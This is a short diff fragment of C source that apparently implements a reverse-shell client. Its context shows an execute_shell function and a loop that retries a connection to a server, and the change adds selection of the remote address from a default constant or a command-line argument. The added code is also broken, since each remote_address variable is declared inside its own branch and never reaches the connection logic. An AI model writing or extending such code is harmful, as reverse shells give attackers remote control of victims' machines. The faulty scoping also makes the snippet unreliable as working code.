@@ -14,7 +14,12 @@ void execute_shell(int socket_fd);
 
 int main(int argc, char** argv)
 {
-	printf("%s\n", argv[1]);
+	if(argc < 2){
+		char * remote_address = REMOTE_ADDRESS;
+	}
+	else{
+		char * remote_address = argv[1];
+	}
 	int sock;
     while( (sock = attempt_connection_to_server()) == -1)
 	{
